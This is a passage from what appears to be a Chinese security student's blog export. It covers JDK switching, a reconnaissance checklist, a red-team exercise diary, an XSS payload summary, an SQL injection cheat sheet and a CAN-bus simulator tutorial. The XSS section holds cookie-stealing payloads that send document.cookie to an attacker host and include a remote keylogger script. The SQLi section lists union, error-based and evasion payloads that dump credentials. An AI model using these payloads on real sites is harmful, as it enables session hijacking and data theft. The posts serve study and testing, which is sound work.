本切换。\nWindows下的JDK版本切换以JDK8和JDK11为例。我们在官网分别下载好安装包。先安装Java8，默认安装路径在C盘。一直确定就行了。安装完成后配置环境变量，网上一堆教程，这边还是讲一下吧。\n以win10为例，右击此电脑，选择属性，选择右边的高级系统设置。\n选择环境变量，之后可以选择在user或是系统变量两者反正网上两个都加了。分别点击新建。进行如下操作：\n\n\n之后我们，进入系统变量的path中。点击新建，如果java默认安装在C盘则是这个路径：\nC:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\n\n然后一直确定，就ok了。\n之后我们打开cmd，输入：\njava -verion \n\n\njavac -version\n\n\n当看都如图所示结果，则代表我们的Java8已经完美安装成功了。\n之后直接安装Java11。双击安装包，将安装路径的默认C盘改为D盘。其它就一直确定就行了。\n一定一个C盘一个D盘，如果都在C盘会发生路径重复之类的事情，反正非常麻烦。\n切换版本进入主题，当安装完成后如何切换版本。目前在网上看到的自动化切换脚本都不是太行。\n那就只能手动切换了。完美将Java8的安装路径和Java11的安装路径分别记录到一个txt文本中。\n按照配置环境变量的过程。打开环境变量后，将前面设置好的JAVA_HOME分别进行修改，将路径改为Java11的路径。用户变量和系统变量同时修改。之后修改系统变量中的path，找到Java那一行，将前面设置的C盘路径修改为D盘路径。\nC:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\n修改为\nD:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\n\n之后我们一直确定就行。\n完成后，打开cmd。输入：\nJava -version\n\n\njavac -verison\n\n\n将看到如图所示结果，表明我们的JDK版本已经修改完成了。\n记住一定要两个命令结果都显示同一版本才行，不然又会发生一些难以理解的问题。还有每次切换完要重新打开cmd才行。不然你看到的还是原来的版本。\nLinux下JDK版本切换这个网上教程一堆，以后有机会在记录。\n\n","slug":"java版本切换","date":"2021-11-26T06:48:05.000Z","categories_index":"Java版本切换","tags_index":"Java","author_index":"Longw"},{"id":"1b77ba18c55109a4d53f945700a7bb03","title":"信息收集流程","content":"\n\n信息收集的重要性简单说，你能不能挖到东西。能不能多挖东西，就看你信息收集的程度。\nwhois信息收集拿到对方网站域名，在站长之家或是在kali中进行whois查询。\nkali中直接\nwhois &lt;域名&gt;    \n如果返回的是英文，那可以直接百度翻译或是谷歌翻译。\n\n嫌麻烦可以直接站长之家进行查询：http://whois.chinaz.com/\n还有这些：https://whois.aliyun.com/ 、 https://www.whois365.com/cn/、 https://whois.aizhan.com/ \n子域名信息收集有时候主域名很难搞，就可以从子域名下手。\n1、子域名挖掘工具 如：Maltego CE、wydomain、subDomainsBrute、dnsmaper、Layer子域名挖掘机。\n2、搜索引擎挖掘 如： 在Google中输入 site:sina.com\n3、第三方网站查询：http://tool.chinaz.com/subdomain、https://dnsdumpster.com/\n4、证书透明度公开日志枚举：https://crt.sh/ 、http://censys.io/\n5、其他途径：https://phpinfo.me/domain 、http://dns.aizhan.com\n敏感信息收集其实敏感信息在护网时可以当作漏洞提交了。\n例如：数据库文件、SQL注入、服务器配置信息、甚至是通过Git找到站点泄露源代码、以及Redis等未授权访问、robots.txt等敏感信息。从而达到渗透测试的目的。\n\n\n\n关键字\n含义\n\n\n\nsite\n指定搜索域名 例如：site:baidu.com\n\n\ninurl\n指定URL中是否存在某些关键字 例如：inurl:.php?id=\n\n\nintext\n指定网页中是否存在某些关键字 例如：intext:网站管理\n\n\nfiletype\n指定搜索文件类型 例如：filetype:txt\n\n\nintitle\n指定网页标题是否存在某些关键字 例如：intitle:后台管理\n\n\nlink\n指定网页链接 例如：link:baidu.com 指定与百度做了外链的站点\n\n\ninfo\n指定搜索网页信息 info:baidu.com\n\n\n还有这个高级用法查询：https://www.exploit-db.com/google-hacking-database\n还有从数据包中发现目标用到编程语言和服务器信息。\n在GitHub上进行收集信息这个其实得看前面收集信息的程度。\nGithub之邮件配置信息泄露：site:Github.com smtp、site:Github.com smtp @qq.com\nGithub之数据库信息泄露：site:Github.com sa password、site:Github.com root password、site:Github.com User ID=’sa’;Password\nGithub之svn信息泄露：site:Github.com svn、site:Github.com svn username\nGithub之综合信息泄露：site:Github.com password、site:Github.com ftp ftppassword、site:Github.com 密码、site:Github.com 内部\n收集真实IP地址先看是否有CDN，使用：http://ping.chinaz.com/\n没有使用CDN可以直接PING\n如果目标使用CDN，需要绕过CDN来获取真实IP地址。1、内部邮箱源  收集到内部邮箱服务器IP地址2、网站phpinfo文件 phpinfo.php3、分站IP地址，查询子域名  CDN很贵，很有可能分站就不再使用CDN。4、国外访问  https://asm.ca.com/en/ping.php5、查询域名解析记录  https://viewdns.info/\n当收集到真实IP就可以直接访问，如果和网址访问一样就代表真实IP，否则则为假。\n端口信息收集使用nmap进行端口扫描\nnmap -A -v -T4 IP   #快速全面探测\nnmap IP --script banner -p 22   #探测22好端口banner信息\nnmap -p 端口号 -sV IP  \nnmap -O IP   #获取操作系统的信息\nnmap -A -V IP   #对目标进行完整的测试\n\n使用masscan\nmasscan --ports 1-10000 目标IP --adapter-ip 本机IP\n\n--adapter-ip 指定发包的ip地址\n\n--adapter-port 指定发包源端口\n\n--adapter-mac 指定发包的源MAC地址\n\n--router-mac 指定网关MAC地址\n\n--exclude IP地址范围黑名单，防止masscan扫描\n\n--excludefile 指定IP地址范围黑名单文件\n\n--includefile,-iL 读取一个范围列表进行扫描\n\n--wait 指定发包后的等待时间\n\n使用Dmitry\ndmitry -p IP\ndmitry -pb IP #获取banner信息\n\n使用netcat\nnc -nvz IP 端口范围\nnc -nvz 192.168.249.110 20-30\nnc -Vn IP 端口号 #获取端口banner信息\n\n\n\n\n端口\n端口说明\n攻击方法\n\n\n\n22\nSSH远程连接\n爆破、SSH隧道及内网代理转发、文件传输\n\n\n23\nTelnet远程连接\n爆破、嗅探、弱口令\n\n\n3389\nrdp远程桌面\nShift后门、爆破\n\n\n5900\nVNC远程连接\n弱口令、RCE\n\n\n5632\nPcAnywhere远程连接\n嗅探、代码执行\n\n\n收集web站点信息CMS在线识别：http://whatweb.bugscaner.com/look/  、 http://www.yunsee.cn/finger.html\nCMS本地识别：whatweb、御剑web指纹识别程序、大禹CMS识别程序 https://github.com/Ms0x0/Dayu\nCMS漏洞查询利用：https://bugs.shuimugan.com\n后台扫描探测工具：\n老版本：                                                              新版本：\n1、御剑后台扫描工具                                         dirmap2、wwwscan命令行工具                                    dirsearch3、dirb命令行工具                                              .git源码泄露4、dirbuster扫描工具\n国外的网站使用wordpress,可以使用wpscan工具进行安全测试。\n使用扫描网站对IP进行探测使用shodan：https://account.shodan.io\n使用钟馗之眼：https://www.zoomeye.org/\n使用FOFA：https://fofa.so/\n使用shodan查看是否有蜜罐：\nshodan honeyscore IP地址\n\n使用集成工具进行信息收集HGather：https://github.com/BaizeSec/HGather\nrailgun：https://github.com/lz520520/railgun  这是使用说明书\n以上内容大部分来自网络。。。。。。\n","slug":"信息收集流程","date":"2021-11-20T11:43:56.000Z","categories_index":"流程","tags_index":"信息收集","author_index":"Longw"},{"id":"c5a6228e829628ebe329c5df737b79b7","title":"第一次护网","content":"\n\n老实讲，这个我都不好意思放出来。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。\n。。。。。、\n、。。。。、。。\n。。。。。。\n。。。。。\n。。。。\n。。。。。\n。。。\n。。。。。\n.。。。。。\n。。。。。\n。。。。。\n。。。。。\n。。。。\n。。。\n。\n。。。。。\n但是要知耻后勇。。。\n小计没想到第一次护网居然是老家。。。。。。。。\n临近年关，等保测评一大批，居然还有护网，虽然只有红队。刚刚实习就上战场了。让我颇感无奈。。。\n不过实战也是学习最多的，基础薄弱啊。。学的杂并且很浅。。。\n一开始发了一些测试网站，尝试入侵。结果不知道如何下手，准备先用扫描工具扫描一波。。更无奈的是awvs又出问题了！！！！无奈只好卸载。卸载好准备重装，结果弹窗重启，电脑卡死了。。。只好强制关机。重启后使用appscan扫描了一个站点，无发现。再次使用弹窗电脑阻止运行。😅😅😅！！！！！！！！！！！！\n没办法了，只有手测。一个一个试试。后台很多，不幸的是我跑的后台基本都不能爆破。好不容易找到弱口令再想上交已经不加分了。😅\n一心想着sql注入，尝试了一批站点全是防火墙过不去。。。。。注册论坛，xss发布任务也没有弹窗。。\n乱打一通，全部白干。。。。。。。。。。。。。。。。。\n好笑的是旁边盛世航明主办方的队伍还在那里嘲讽。。。虽然我没有丧失信心，但是还是挺羞愧的。\n也是挺佩服他们的，短短几个小时就攻下了好几个站点。。。\n经验忽略了最要紧的信息收集，吃了很大很大的亏。。。。下决心，先把这方面弄到流程化。\n其他先按部就班的学吧。还要会对cve漏洞进行利用。\n不够细心，容易忽略细节，关键就是细节。\n看了一下另一支队伍挖到的sql注入，不仅是他信息收集做的好，还有他很细心。一直手动测试，结果发现忽略了工具的使用。\n思路很重要，但是你得到一定水平才知道该怎么办。\n一定要定一个流程，没什么发现就按照流程走一遍。有了发现才能进行深入。\n反正也是加油吧！！！努力学习！！！希望有一天也能打个护网前几试试。\n","slug":"第一次护网","date":"2021-11-19T15:36:33.000Z","categories_index":"总结","tags_index":"总结","author_index":"Longw"},{"id":"092a8eb566bb4d51073324d6cfbab7e6","title":"XSS总结","content":"\n\npayload来自csdn-仙女象\n反射型XSS&lt;script&gt;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&lt;&#x2F;script&gt;  \n#获取cookie，需要攻击机开机http服务\npython2 -m SimpleHTTPServer 8899\n\n大小写绕过\n使用其他标签\n编码绕过\n&lt;sCript&gt;alert(1)&lt;&#x2F;script&gt;\n&lt;img src&#x3D;x οnerrοr&#x3D;alert(1)&gt;\n&lt;img src&#x3D;x οnerrοr&#x3D;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&gt;\n\n&lt;a href&#x3D;&quot;&quot; οnclick&#x3D;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#119;&amp;#114;&amp;#105;&amp;#116;&amp;#101;&amp;#40;&#39;&amp;#60;&amp;#105;&amp;#109;&amp;#103;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#105;&amp;#112;&amp;#58;&amp;#56;&amp;#56;&amp;#57;&amp;#57;&amp;#47;&#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#43;&#39;&amp;#34;&amp;#47;&amp;#62;&#39;&amp;#41;&gt;hh&lt;&#x2F;a&gt;\n#onclick后面是html实体编码了，明文payload是&lt;a href&#x3D;&quot;&quot; οnclick&#x3D;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&gt;hh&lt;&#x2F;a&gt;\n\n&lt;img alt&#x3D;x οnmοuseοver&#x3D;alert(1)&gt;\n&lt;img alt&#x3D;x οnmοuseοver&#x3D;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&gt;\n&lt;input οnblur&#x3D;&quot;alert(1)&quot;&gt;\n&lt;input οnblur&#x3D;&quot;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&quot;&gt;\n\n存储型XSS&lt;script&gt;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&lt;&#x2F;script&gt;\n#获取cookie，需要攻击机开机http服务\npython2 -m SimpleHTTPServer 8899\npython3 -m http.server 8899\n\n修改客户端源代码绕过长度限制\n大小写绕过，双写绕过\n&lt;scrip&lt;script&gt;t&gt;alert(1)&lt;&#x2F;scrip&lt;script&gt;t&gt;\n&lt;img src&#x3D;x οnerrοr&#x3D;alert(1)&gt;\n&lt;iframe οnlοad&#x3D;alert(1)&gt;&lt;&#x2F;iframe&gt;\n\n&lt;a href&#x3D;&quot;&quot; οnclick&#x3D;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#119;&amp;#114;&amp;#105;&amp;#116;&amp;#101;&amp;#40;&#39;&amp;#60;&amp;#105;&amp;#109;&amp;#103;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#105;&amp;#112;&amp;#58;&amp;#56;&amp;#56;&amp;#57;&amp;#57;&amp;#47;&#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#43;&#39;&amp;#34;&amp;#47;&amp;#62;&#39;&amp;#41;&gt;hh&lt;&#x2F;a&gt;\n\n\nDOM型XSS-payload来自csdn谢公子http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;alert(&#39;hack&#39;)&lt;&#x2F;script&gt;\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&lt;img src&#x3D;1 οnerrοr&#x3D;alert(&#39;hack&#39;)&gt; \n我们得先闭合前面的标签，我们构造语句闭合option标签：\n &lt;option value&#x3D;&#39;     &quot; + lang + &quot;      &#39;&gt;  &quot;  + decodeURI(lang) +  &quot;  &lt;&#x2F;option&gt;\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&gt;&lt;&#x2F;option&gt;&lt;img src&#x3D;1 οnerrοr&#x3D;alert(&#39;hack&#39;)&gt; \n\n继续构造语句去闭合select标签\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D; &gt;&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;img src&#x3D;1 οnerrοr&#x3D;alert(&#39;hack&#39;)&gt;\n\n&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;var img&#x3D;document.createElement(&quot;img&quot;);img.src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;a?&quot;+escape(document.cookie);&lt;&#x2F;script&gt;  #获取cookie\n\n&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;document.body.innerHTML&#x3D;&quot;&lt;div style&#x3D;visibility:visible;&gt;&lt;h1&gt;DOM XSS By SKI12&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&quot;;&lt;&#x2F;script&gt;\n#篡改页面\n\n&#x2F;xss_d&#x2F;?default&#x3D;&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;keylogger.js&quot;&gt;&lt;&#x2F;script&gt;\n#键盘记录，有js文件和php文件。来自于csdn-Mi1k7ea\n\n","slug":"XSS总结","date":"2021-11-09T13:57:15.000Z","categories_index":"安全漏洞基础","tags_index":"owasp TOP 10","author_index":"Longw"},{"id":"9ddada27b22150ae5fda04e61970ba8b","title":"SQL注入1","content":"\n\n最近本来是打算投简历看看的，结果当场面试了，很尴尬。笔试发现自己菜的扣脚。。。毕竟接触时间较短，发现好多我不懂的问题，连http协议都有地方不会。。。。。。。。https的s是用来防止中间人攻击的，反射型xss不是在服务器上。\n一个漏洞一个漏洞的总结吧。。。。\n常见注入点\n表单中的输入域\n URL的参数\n Cookie或者隐藏域\n\n注入点检测?id&#x3D;1     #测试点\n?id&#x3D;1&#39;   #单引号报错\n?id&#x3D;1&quot;   #双引号报错\n?id&#x3D;1\\   #反斜杠报错\n?id&#x3D;1&#39;--+    #注释后面\n?id&#x3D;1&#39;)--+\n?id&#x3D;1&#39;))--+  #有的需要加)或者两个))\n?id&#x3D;1 and 1&#x3D;1 #数字型不变逻辑,后面可加注释如:--+,#等\n?id&#x3D;1 and 1&#x3D;2 #空集逻辑\n?id&#x3D;1 or 1&#x3D;1  #全集逻辑\n?id&#x3D;1&#39;and &#39;1&#39;&#x3D;&#39;1 #字符型不变逻辑，其他如上\n?id&#x3D;1+and+1&#x3D;1--+  #用加号代替空格\n上面还可以进行url编码，有些浏览器自动将空格编码，有些则没有，可以自己利用url编码工具进行编码。\n前面的如果有明显变化的，表示可能存在注入点。若没有明显变化,则可以使用sleep函数测试。\n?id&#x3D;1&#39; and sleep(5)  #用sleep函数进行注入点测试\n当然我们可以直接利用sqlmap进行注入点检测，在kali中\nsqlmap -u http:&#x2F;&#x2F;xxx.xx?id&#x3D;1   #将会自动检测\n\n注入利用–MySQL判断数据库user(),version()\n不同的数据库返回值都各有特征，进而推断是什么数据库类型。\n如user()函数返回情况：\n     mysql返回root@localhost\n     oracle返回sys\n     sqlserver返回sa\n执行成功，即探子回报。说明程序对函数，括号()和子查询并未做过滤，可能可以执行函数、子查询等复杂逻辑。\n探子没有回报，基本上说明注入攻击困难或者注入可能性很小。\n\nGET类型-有回显点order by 3  #判断字段数\n?id&#x3D;1&#39;and 0&#x3D;9 union select 1,2,3  #判断回显点\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(schema_name),3 from information_schema.schemata --+ \n#获取所有库名\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(distinct table_schema),3 from    information_schema.tables --+\n#获取所有库名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() --+   #获取表名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; --+   #获取字段名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(username,0x3a,password),3 from users--+  #获取字段值\n\n\n相关函数和数据库结构信息User() current_user() session_user() 返回当前连接的用户名（包含主机名）\nversion() 数据库版本号\ndatabase() 当前连接的数据库名\nlength()   计算字符串长度\nleft()    取最左边的字符\nsubstring() 取字符串中任意长度字长\nposition()  返回字符所在字符串中的位置\nlocate()    返回字符所在字符串中的位置\n在Mysql 5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata(数据库名)、tables(表名)、columns(列名或字段名)。ROUTINES 存储过程或者函数信息,VIEWS 视图信息,TRIGGERS 触发器信息\n\n在schemata表中，schema_name字段用来存储数据库名。\n在tables表中，table_schema和table_name分别用来存储数据库名和表名。\n在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)\n拓展limit关键字  limit m,n 从m行开始，到m+n行\n\n盲注?id&#x3D;1&#39;and if(left(version(),1)&#x3D;5,sleep(1),2)  #利用sleep函数判断版本号或者用户名，密码等\n?id&#x3D;1&#39; and if(substring(uname,1,1)&#x3D;&#39;b&#39;,benchmark(10000000,md5(&#39;b&#39;)),1)  #Benchmark穷举法猜测用户名和密码等\nSelect sleep(1);睡眠1秒\nSelect left(user(),1)获得user()最左边的1位\nSubstring()获得字符串任意位置的任意个字符\nBenchmark()对运算执行压力测试\nIf()表达式，第一个表达式为真，则执行第二个表达式，否则执行第三个表达式\n一般利用工具盲注，太麻烦太耗时间了。\n\n报错注入没有错误也要制造错误，并把查询的信息让错误带出来告诉注入者到底有什么东西，把所有家底能透露的都透露了。\n相关函数：If(),rand(),floor(),ifnull(),concat,group_concat()\nSelect count(*),concat(version(),floor(rand()*2),user()) as a from users group by a  #暴露系统用户名敏感信息\n\n?id&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+   #获取数据库\n\nselect count(*),concat((select (select (SELECT schema_name FROM information_schema.schemata limit 0,1)) as a_col from information_schema.tables limit 0,1),floor(rand(0)*2)) x_col from information_schema.tables group by x_col   #获取所有库名\n\n?id&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+  #获取表名\n\nselect count(*),concat((select (select (SELECT table_name FROM information_schema.tables where table_schema&#x3D;database() limit 0,1)) as a_col from information_schema.tables limit 0,1),floor(rand(0)*2))x_col from information_schema.tables group by x_col   #获取所有表名\n\n\nid&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+   #获取用户信息\n\n?id&#x3D; 0&quot; union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 --+   #双引号报错注入，前面是单引号。\n\n?id&#x3D;1 and updatexml(2,concat(0x7e,database(),0x7e),1);   \n#利用updatexml函数进行注入,database()是系统函数返回系统变量database的值。@@version代表系统变version\n?id&#x3D;1 and updatexml(2,concat(0x7e,@@version,0x7e),1);\n\n?id&#x3D;1 and extractvalue(1,concat(0x7e,database(),0x7e));   #利用extractvalue函数进行注入\n?id&#x3D;1 and extractvalue(1,concat(0x7e,@@version,0x7e));\n\n宽字节注入当数据库使用gbk编码时，使用%DF%5C，%bf%5c进行宽字节注入，将单引号闭合。\nasscii大于128， GBK首字节对应0x81–0xFE,尾字节对应0x40–0xFE(除去0x7F)。\nSQLMAP使用–tamper=unmagicquotes.py脚本。\n二次注入注入payload，再利用如重置密码功能修改管理员密码。\nadmin&#39;-- -\n\n注入payload，触发xss攻击。\nAccess注入(ASP+Access)只有表，直接用sqlmap查表,基本基于字典\nsqlmap -u url --tables\n\nAccess偏移注入知道表名，得不到字段。\n1.判断字段数 order by\n2.判断表名  使用union select * from 表名,如admin\n3.偏移注入  利用公式注入\n?id&#x3D;1+union+select+1,2,3,4,5,6,7,8,9+from+admin\n?id&#x3D;1+union+select+1,2,3,4,5,*+from+admin  \n#一个一个测试，到5用*号代替显示正常，利用公式\n9-5&#x3D;4;9-4*2&#x3D;1;则从1之后开始\n当前admin表中字段数就为4；\n?id&#x3D;1+union+select+1,a.id,b.id,*+from+(admin+as+a+inner+join+admin+as+b+on+a.id&#x3D;b.id)\n\n\n\n规避检查or–+2=!!!2 类假!!!2为真的结果，利用不变逻辑的!!!替代空格注释替代 and//select//uname//from//users+号连接字符替换\n大小写绕过\nand\n改为\nAnD \n\n双写绕过\nunion\n改为\nuniunionon\n\nand改为&amp;&amp;，or改为||.\n/*!内联*/  内联注释，会执行看里面的内容\n&#x2F;*!union*&#x2F; select 1,2,3 --+\n\n/**/多行注释\nun&#x2F;**&#x2F;ion select 1,2,3 --+\n\n将语句进行url编码\n十六进制码替代%20ASCII码替换char(32)\nand substring(user(),1,1)&#x3D;‘z’\n改为\nand asci(substring(user(),1,1))&#x3D;122   #规避了单引号\n\n空格替换\n%0a  新建一行\n%09  TAB键（水平）\n%0d  return功能\n%0b  TAB键（垂直）\n%0c  新建一页\n%20  就是空格\nhex编码\n\n还有好多内容啊，等后面一一总结吧！！！\n现在的网站基本上都防御了sql注入。想在网站上找到注入点真难。。还是玩靶场好一点。\n","slug":"SQL注入1","date":"2021-11-08T11:24:23.000Z","categories_index":"安全漏洞基础","tags_index":"owasp TOP 10","author_index":"Longw"},{"id":"ebc4d430e2c23dfe4e07a222f7299552","title":"汽车黑客入门","content":"\n\n最近在telegram上找到一个安全实验室的成员，关注了一下。发现她的研究方向是汽车黑客，看了一下他发的汽车黑客入门，挺有意思的。。。。。。\n分为基础篇，模拟器篇，案例篇。\n原作者：https://www.hackers-arise.com/automobile-hacking\n基础篇仔细看了一下，前面讲的都是硬件、协议啊、数据包类型啊之类的。大概能看懂，就不写了，无聊嘛。后面写到是买一个蓝牙ODB II迷你接口用来连接连接到汽车的OBD II接口。完蛋，第一篇没车不弄了。\n后面就是使用kali中msf自带的攻击模块，进行攻击。\nICS模拟器篇因为没车，所以就玩模拟器。\n\n安装模拟器\n\n我们打开kali终端安装必要的依赖\nsudo apt install libsdl2-dev libsdl2-image-dev -y\n\n等待安装完成，接下来就是安装模拟器\ngit clone https:&#x2F;&#x2F;github.com&#x2F;zombieCraig&#x2F;ICSim\n\n等待安装完成。\nsudo modprobe vcan &#x2F;&#x2F;加载模块\nsudo ip link add dev vcan0 type vcan &#x2F;&#x2F;为设备名称为vcan0类 型为vcan的设备增加虚拟接口\nsudo ip link set up vcan0 &#x2F;&#x2F;激活vcan0\nifconfig vcan0 &#x2F;&#x2F;验证配置\n\ncd ICSim    #进入下载好的目录\nsudo bash setup_vcan.sh     #运行文件\n\n前面正常的话就可以进行编译了。\nmake\n\n\n玩模拟器\n\n接下来打开模拟器\n.&#x2F;contorls vcan0     #这是控制界面\n然后再打开一个终端进入安装目录\n.&#x2F;icsim vcan0    #这是汽车模拟器\n\n然后你的界面就会出现两个小窗口，这就是你的模拟器和控制器。没有截图，纯手工描写。\n接下来就是叫你如何使用模拟器\n有手柄按照操控界面提示来\n没有手柄就用键盘\n数字旁边有个上下左右那个\n按-&gt; 加上enter 就会亮起信号灯，另一个就不用讲了\n按住-&gt; + shift + a&#x2F;b&#x2F;xy 就会分别打开汽车的车门。至于关门，看不懂，研究好久没弄出来。\n按住 ^ + enter  就会加速 \n\n要学的暂时就这么多了。\n因为上一篇没写，所以没安装工具。现在来安装工具。\ngit clone https:&#x2F;&#x2F;github.com&#x2F;linux-can&#x2F;can-utils.git\n\n下面是工具的一些基础知识\ncan-utils工具可以被分为几个功能组\n1. 显示、记录、生成和重放CAN通信的基本工具\n2. 通过IP socket 访问CAN\n3. CAN内核网关的配置 \n4. CAN总线测量\n5. ISO-TP工具 \n6. 日志文件转换器 \n7. 串行线规范（slc）配置 \n因为刚刚起步，我们将只关注基本工具和日志文件转换器。\ncan-utils中的工具及其功能的完整列表如下： \n\n1. 显示，记录，生成和重放CAN流量的基本工具\ncandump：显示，过滤和记录CAN数据，导出到文件\ncanplayer：重播CAN日志文件\ncansend：发送单个帧\ncangen：生成（随机）CAN流量\ncansniffer：比对CAN数据内容的差异（仅11位CAN ID） \n\n2. 通过IP socket进行CAN访问\ncanlogserver：记录来自远程或本地主机的CAN帧\nbcmserver：交互式BCM配置（远程&#x2F;本地）\nsocketcand：通过TCP &#x2F; IP socket 使用RAW &#x2F; BCM &#x2F; ISO-TP socket\n\n3. CAN内核网关配置\ncangw：用于netlink配置的CAN网关userpace工具\n\n4. CAN总线的测量和测试\ncanbusload：计算并显示CAN总线负载\ncan-calc-bit-timing：内核空间比特率计算的用户空间版本\ncanfdtest：全双工测试程序（DUT和主机部分） \n\n5. 适用于Linux的ISO-TP工具ISO15765-2：2016\nisotpsend：发送单个ISO-TP PDU\nisotprecv：接收ISO-TP PDU\nisotpsniffer：“窃听” ISO-TP PDU\nisotpdump：“窃听”并解释CAN消息（CAN_RAW）\nisotpserver：用于简单的TCP &#x2F; IP 与 ISO 15765-2 桥接（ASCII HEX）的IP服务器\nisotpperf：ISO15765-2协议的性能可视化\nisotptun：通过ISO-TP在CAN上创建双向IP隧道\n\n6. 日志文件转换器\nasc2log：将ASC日志文件转换为紧凑型CAN框架日志文件\nlog2asc：将紧凑型CAN框架日志文件转换为ASC日志文件\nlog2long：将紧凑的CAN帧表示形式转换为用户可读 \n\n7. 串行线路规范配置（用于slcan驱动程序）\nslcan_attach：用于串行线CAN接口配置的用户空间工具\nslcand：用于串行线CAN接口配置的守护程序\nslcanpty：使用slcan ASCII协议为应用程序创建一个pty\n\n安装完成之后，我们先进入工具目录\nCCansniffer过滤特定流量\ncansniffer -c vcan0    #用来嗅探CAN的流量\n当我们使用-c选项时，正在变化的值会变成红色，以帮助我们识别这些关键值。\n使用-h参数查看帮助\n\n回车后，会发现一直跳跳跳，正常现象。\n接下来输入\n-000000\n\n输入完，回车。就会发现跳的流量没有了。\n+40C    #就会显示ID&#x3D;40C的流量\n\nCandump捕获CAN流量\ncandump -c -l vcan0   #-l 参数来记录，-c参数对输出进行着色。\n\ncandump -c -l -s 0 -a vcan0   #记录的同时，进行输出\n\ncanplayer进行重放\ncanplayer -I candump-xxx.log   #因为文件名不一样，直接tab键补全\n\ncansend 发送自定义帧\ncansend vcan0 40C#033133383439000d      #发送40C这一帧数据\nvcan0是接口\n40C＃是框架ID\n000005500108000D是我们要发送的数据\n\n\n逆向\n\n在了解了工具的使用之后，我们开始逆向工程。在控制板输入加油门指令进行加速，并且抓取数据流。\n当速度达到100就可以松开。\ncansniffer -c vcan0\n-000000\n+244                 #ID为244的数据包可能是汽车加速的数据包\n\ncansend vcan0 244#0000003812   #向汽车发送数据包，看能否是汽车速度达到100\n\n因为信号单一，看不到任何效果，那么就可以使用\nwhile true; do cansend vcan0 244#0000003812; 